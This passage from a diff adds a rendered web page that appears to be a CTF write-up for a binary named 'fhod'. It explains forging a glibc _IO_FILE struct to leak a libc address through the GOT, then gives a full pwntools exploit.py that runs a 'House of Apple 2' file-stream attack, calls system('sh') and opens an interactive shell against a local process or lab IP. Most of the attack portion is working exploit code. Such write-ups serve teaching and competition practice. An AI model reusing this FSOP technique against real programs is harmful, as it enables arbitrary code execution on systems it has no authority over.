+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="cm">/*    112      |       4 */</span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">_fileno</span><span class="p">;</span>
+</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="cm">/*    116      |       4 */</span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">_flags2</span><span class="p">;</span>
+</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="cm">/*    120      |       8 */</span><span class="w">    </span><span class="n">__off_t</span><span class="w"> </span><span class="n">_old_offset</span><span class="p">;</span>
+</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="cm">/*    128      |       2 */</span><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="w"> </span><span class="n">_cur_column</span><span class="p">;</span>
+</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="cm">/*    130      |       1 */</span><span class="w">    </span><span class="kt">signed</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">_vtable_offset</span><span class="p">;</span>
+</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="cm">/*    131      |       1 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="cm">/* XXX  4-byte hole      */</span>
+</span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="cm">/*    136      |       8 */</span><span class="w">    </span><span class="n">_IO_lock_t</span><span class="w"> </span><span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
+</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="cm">/*    144      |       8 */</span><span class="w">    </span><span class="n">__off64_t</span><span class="w"> </span><span class="n">_offset</span><span class="p">;</span>
+</span><span id="__span-11-26"><a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a><span class="cm">/*    152      |       8 */</span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_codecvt</span><span class="w"> </span><span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
+</span><span id="__span-11-27"><a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a><span class="cm">/*    160      |       8 */</span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_wide_data</span><span class="w"> </span><span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
+</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="cm">/*    168      |       8 */</span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
+</span><span id="__span-11-29"><a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a><span class="cm">/*    176      |       8 */</span><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
+</span><span id="__span-11-30"><a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a><span class="cm">/*    184      |       8 */</span><span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">__pad5</span><span class="p">;</span>
+</span><span id="__span-11-31"><a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a><span class="cm">/*    192      |       4 */</span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">_mode</span><span class="p">;</span>
+</span><span id="__span-11-32"><a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a><span class="cm">/*    196      |      20 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">_unused2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></code></pre></div>
+<p>We need to construct an <code>_IO_FILE</code> object so that the next write operation on it reads from an address instead and gives us its contents. Luckily, since PIE is disabled, we can read from a GOT address and leak an address from libc. I chose to leak the address of <code>printf</code>. This can be done by  </p>
+<ul>
+<li>Setting <code>_flags = 0xFBAD1800</code> which corresponds to  <code>_IO_MAGIC | _IO_IS_APPENDING | _IO_IS_CURRENTLY_PUTTING</code>. See [<a href="https://elixir.bootlin.com/glibc/glibc-2.40/source/libio/libio.h">https://elixir.bootlin.com/glibc/glibc-2.40/source/libio/libio.h</a>]</li>
+<li>Setting <code>_IO_read_ptr</code>, <code>_IO_read_end</code> and <code>_IO_read_base</code> to the address of <code>printf</code> in GOT </li>
+<li>Setting <code>_IO_write_ptr</code> and <code>_IO_write_end</code> to the <code>address + 0x8</code> to specify end of read</li>
+<li>Setting <code>_fileno</code> to 1 for <code>stdout</code></li>
+</ul>
+<p>The next call to <code>_IO_write</code> leaks the address of <code>printf</code> in libc to <code>stdout</code> and then we can calculate the base address of libc from there. Once we have the libc leak we perform the next FSOP attack which is called "House of Apple 2"</p>
+<h2 id="final-exploit">Final Exploit<a class="headerlink" href="#final-exploit" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">exploit.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span>
+<span class="normal"><a href="#__codelineno-12-13">13</a></span>
+<span class="normal"><a href="#__codelineno-12-14">14</a></span>
+<span class="normal"><a href="#__codelineno-12-15">15</a></span>
+<span class="normal"><a href="#__codelineno-12-16">16</a></span>
+<span class="normal"><a href="#__codelineno-12-17">17</a></span>
+<span class="normal"><a href="#__codelineno-12-18">18</a></span>
+<span class="normal"><a href="#__codelineno-12-19">19</a></span>
+<span class="normal"><a href="#__codelineno-12-20">20</a></span>
+<span class="normal"><a href="#__codelineno-12-21">21</a></span>
+<span class="normal"><a href="#__codelineno-12-22">22</a></span>
+<span class="normal"><a href="#__codelineno-12-23">23</a></span>
+<span class="normal"><a href="#__codelineno-12-24">24</a></span>
+<span class="normal"><a href="#__codelineno-12-25">25</a></span>
+<span class="normal"><a href="#__codelineno-12-26">26</a></span>
+<span class="normal"><a href="#__codelineno-12-27">27</a></span>
+<span class="normal"><a href="#__codelineno-12-28">28</a></span>
+<span class="normal"><a href="#__codelineno-12-29">29</a></span>
+<span class="normal"><a href="#__codelineno-12-30">30</a></span>
+<span class="normal"><a href="#__codelineno-12-31">31</a></span>
+<span class="normal"><a href="#__codelineno-12-32">32</a></span>
+<span class="normal"><a href="#__codelineno-12-33">33</a></span>
+<span class="normal"><a href="#__codelineno-12-34">34</a></span>
+<span class="normal"><a href="#__codelineno-12-35">35</a></span>
+<span class="normal"><a href="#__codelineno-12-36">36</a></span>
+<span class="normal"><a href="#__codelineno-12-37">37</a></span>
+<span class="normal"><a href="#__codelineno-12-38">38</a></span>
+<span class="normal"><a href="#__codelineno-12-39">39</a></span>
+<span class="normal"><a href="#__codelineno-12-40">40</a></span>
+<span class="normal"><a href="#__codelineno-12-41">41</a></span>
+<span class="normal"><a href="#__codelineno-12-42">42</a></span>
+<span class="normal"><a href="#__codelineno-12-43">43</a></span>
+<span class="normal"><a href="#__codelineno-12-44">44</a></span>
+<span class="normal"><a href="#__codelineno-12-45">45</a></span>
+<span class="normal"><a href="#__codelineno-12-46">46</a></span>
+<span class="normal"><a href="#__codelineno-12-47">47</a></span>
+<span class="normal"><a href="#__codelineno-12-48">48</a></span>
+<span class="normal"><a href="#__codelineno-12-49">49</a></span>
+<span class="normal"><a href="#__codelineno-12-50">50</a></span>
+<span class="normal"><a href="#__codelineno-12-51">51</a></span>
+<span class="normal"><a href="#__codelineno-12-52">52</a></span>
+<span class="normal"><a href="#__codelineno-12-53">53</a></span>
+<span class="normal"><a href="#__codelineno-12-54">54</a></span>
+<span class="normal"><a href="#__codelineno-12-55">55</a></span>
+<span class="normal"><a href="#__codelineno-12-56">56</a></span>
+<span class="normal"><a href="#__codelineno-12-57">57</a></span>
+<span class="normal"><a href="#__codelineno-12-58">58</a></span>
+<span class="normal"><a href="#__codelineno-12-59">59</a></span>
+<span class="normal"><a href="#__codelineno-12-60">60</a></span>
+<span class="normal"><a href="#__codelineno-12-61">61</a></span>
+<span class="normal"><a href="#__codelineno-12-62">62</a></span>
+<span class="normal"><a href="#__codelineno-12-63">63</a></span>
+<span class="normal"><a href="#__codelineno-12-64">64</a></span>
+<span class="normal"><a href="#__codelineno-12-65">65</a></span>
+<span class="normal"><a href="#__codelineno-12-66">66</a></span>
+<span class="normal"><a href="#__codelineno-12-67">67</a></span>
+<span class="normal"><a href="#__codelineno-12-68">68</a></span>
+<span class="normal"><a href="#__codelineno-12-69">69</a></span>
+<span class="normal"><a href="#__codelineno-12-70">70</a></span>
+<span class="normal"><a href="#__codelineno-12-71">71</a></span>
+<span class="normal"><a href="#__codelineno-12-72">72</a></span>
+<span class="normal"><a href="#__codelineno-12-73">73</a></span>
+<span class="normal"><a href="#__codelineno-12-74">74</a></span>
+<span class="normal"><a href="#__codelineno-12-75">75</a></span>
+<span class="normal"><a href="#__codelineno-12-76">76</a></span>
+<span class="normal"><a href="#__codelineno-12-77">77</a></span>
+<span class="normal"><a href="#__codelineno-12-78">78</a></span>
+<span class="normal"><a href="#__codelineno-12-79">79</a></span>
+<span class="normal"><a href="#__codelineno-12-80">80</a></span>
+<span class="normal"><a href="#__codelineno-12-81">81</a></span>
+<span class="normal"><a href="#__codelineno-12-82">82</a></span>
+<span class="normal"><a href="#__codelineno-12-83">83</a></span>
+<span class="normal"><a href="#__codelineno-12-84">84</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./fhod_patched&#39;</span><span class="p">)</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.18.50&#39;</span><span class="p">,</span> <span class="mi">55590</span><span class="p">)</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="k">else</span><span class="p">:</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="n">READ</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a><span class="n">WRITE</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;2&quot;</span>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16"></a>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17"></a><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18"></a>    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19"></a>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20"></a><span class="k">def</span> <span class="nf">openfile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">mode</span> <span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;open: &#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
+</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Descriptor: &#39;</span><span class="p">)</span>
+</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26"></a>
+</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27"></a><span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;5&quot;</span><span class="p">)</span>
+</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;write: &quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span id="__span-12-30"><a id="__codelineno-12-30" name="__codelineno-12-30"></a>
+</span><span id="__span-12-31"><a id="__codelineno-12-31" name="__codelineno-12-31"></a><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+</span><span id="__span-12-32"><a id="__codelineno-12-32" name="__codelineno-12-32"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+</span><span id="__span-12-33"><a id="__codelineno-12-33" name="__codelineno-12-33"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span><span id="__span-12-34"><a id="__codelineno-12-34" name="__codelineno-12-34"></a>
+</span><span id="__span-12-35"><a id="__codelineno-12-35" name="__codelineno-12-35"></a><span class="k">def</span> <span class="nf">closefile</span><span class="p">():</span>
+</span><span id="__span-12-36"><a id="__codelineno-12-36" name="__codelineno-12-36"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
+</span><span id="__span-12-37"><a id="__codelineno-12-37" name="__codelineno-12-37"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span><span id="__span-12-38"><a id="__codelineno-12-38" name="__codelineno-12-38"></a>
+</span><span id="__span-12-39"><a id="__codelineno-12-39" name="__codelineno-12-39"></a><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span><span id="__span-12-40"><a id="__codelineno-12-40" name="__codelineno-12-40"></a>    <span class="n">got_printf</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+</span><span id="__span-12-41"><a id="__codelineno-12-41" name="__codelineno-12-41"></a>
+</span><span id="__span-12-42"><a id="__codelineno-12-42" name="__codelineno-12-42"></a>    <span class="n">structfile</span> <span class="o">=</span> <span class="n">openfile</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/tmp/hello&quot;</span><span class="p">,</span> <span class="n">WRITE</span><span class="p">)</span>
+</span><span id="__span-12-43"><a id="__codelineno-12-43" name="__codelineno-12-43"></a>    <span class="n">structfile</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">structfile</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span><span id="__span-12-44"><a id="__codelineno-12-44" name="__codelineno-12-44"></a>
+</span><span id="__span-12-45"><a id="__codelineno-12-45" name="__codelineno-12-45"></a>    <span class="n">log</span><span class="o">.</span><span class="n">info</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Struct file: </span><span class="si">{</span><span class="n">structfile</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-12-46"><a id="__codelineno-12-46" name="__codelineno-12-46"></a>
+</span><span id="__span-12-47"><a id="__codelineno-12-47" name="__codelineno-12-47"></a>    <span class="n">fstruct</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+</span><span id="__span-12-48"><a id="__codelineno-12-48" name="__codelineno-12-48"></a>    <span class="n">fstruct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span>
+</span><span id="__span-12-49"><a id="__codelineno-12-49" name="__codelineno-12-49"></a>    <span class="n">fstruct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_printf</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+</span><span id="__span-12-50"><a id="__codelineno-12-50" name="__codelineno-12-50"></a>    <span class="n">fstruct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_printf</span><span class="p">)</span><span class="o">*</span><span class="mi">1</span>
+</span><span id="__span-12-51"><a id="__codelineno-12-51" name="__codelineno-12-51"></a>    <span class="n">fstruct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_printf</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span><span id="__span-12-52"><a id="__codelineno-12-52" name="__codelineno-12-52"></a>    <span class="n">fstruct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_printf</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+</span><span id="__span-12-53"><a id="__codelineno-12-53" name="__codelineno-12-53"></a>    <span class="n">fstruct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+</span><span id="__span-12-54"><a id="__codelineno-12-54" name="__codelineno-12-54"></a>
+</span><span id="__span-12-55"><a id="__codelineno-12-55" name="__codelineno-12-55"></a>    <span class="n">modify</span><span class="p">(</span><span class="n">fstruct</span><span class="p">)</span>
+</span><span id="__span-12-56"><a id="__codelineno-12-56" name="__codelineno-12-56"></a>
+</span><span id="__span-12-57"><a id="__codelineno-12-57" name="__codelineno-12-57"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+</span><span id="__span-12-58"><a id="__codelineno-12-58" name="__codelineno-12-58"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;file: &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+</span><span id="__span-12-59"><a id="__codelineno-12-59" name="__codelineno-12-59"></a>    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span>
+</span><span id="__span-12-60"><a id="__codelineno-12-60" name="__codelineno-12-60"></a>    <span class="n">libc_printf</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+</span><span id="__span-12-61"><a id="__codelineno-12-61" name="__codelineno-12-61"></a>    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">printf</span>
+</span><span id="__span-12-62"><a id="__codelineno-12-62" name="__codelineno-12-62"></a>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-12-63"><a id="__codelineno-12-63" name="__codelineno-12-63"></a>
+</span><span id="__span-12-64"><a id="__codelineno-12-64" name="__codelineno-12-64"></a>    <span class="n">vtable</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_wfile_jumps</span> <span class="o">-</span> <span class="mh">0x18</span> <span class="c1"># _IO_wfile_overflow</span>
+</span><span id="__span-12-65"><a id="__codelineno-12-65" name="__codelineno-12-65"></a>
+</span><span id="__span-12-66"><a id="__codelineno-12-66" name="__codelineno-12-66"></a>    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span><span id="__span-12-67"><a id="__codelineno-12-67" name="__codelineno-12-67"></a>        <span class="n">unpack</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; sh&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)),</span>
+</span><span id="__span-12-68"><a id="__codelineno-12-68" name="__codelineno-12-68"></a>        <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span>
+</span><span id="__span-12-69"><a id="__codelineno-12-69" name="__codelineno-12-69"></a>        <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span>
+</span><span id="__span-12-70"><a id="__codelineno-12-70" name="__codelineno-12-70"></a>        <span class="p">(</span><span class="n">structfile</span><span class="o">+</span><span class="mh">0x78</span><span class="p">)</span><span class="o">-</span><span class="mh">0x68</span><span class="p">,</span>
+</span><span id="__span-12-71"><a id="__codelineno-12-71" name="__codelineno-12-71"></a>        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">,</span>
+</span><span id="__span-12-72"><a id="__codelineno-12-72" name="__codelineno-12-72"></a>        <span class="mh">0x0</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span>
+</span><span id="__span-12-73"><a id="__codelineno-12-73" name="__codelineno-12-73"></a>        <span class="n">structfile</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">structfile</span><span class="o">-</span><span class="mh">0x70</span><span class="p">,</span>
+</span><span id="__span-12-74"><a id="__codelineno-12-74" name="__codelineno-12-74"></a>        <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span>
+</span><span id="__span-12-75"><a id="__codelineno-12-75" name="__codelineno-12-75"></a>        <span class="n">vtable</span>
+</span><span id="__span-12-76"><a id="__codelineno-12-76" name="__codelineno-12-76"></a>    <span class="p">)</span>
+</span><span id="__span-12-77"><a id="__codelineno-12-77" name="__codelineno-12-77"></a>    <span class="n">modify</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-12-78"><a id="__codelineno-12-78" name="__codelineno-12-78"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+</span><span id="__span-12-79"><a id="__codelineno-12-79" name="__codelineno-12-79"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
+</span><span id="__span-12-80"><a id="__codelineno-12-80" name="__codelineno-12-80"></a>    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span><span id="__span-12-81"><a id="__codelineno-12-81" name="__codelineno-12-81"></a>    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-12-82"><a id="__codelineno-12-82" name="__codelineno-12-82"></a>
+</span><span id="__span-12-83"><a id="__codelineno-12-83" name="__codelineno-12-83"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span id="__span-12-84"><a id="__codelineno-12-84" name="__codelineno-12-84"></a>    <span class="n">main</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="running-the-exploit">Running the Exploit<a class="headerlink" href="#running-the-exploit" title="Permanent link">&para;</a></h3>
+<p><img alt="Pasted image 20241121044550.png" src="../../../images/Pasted%20image%2020241121044550.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
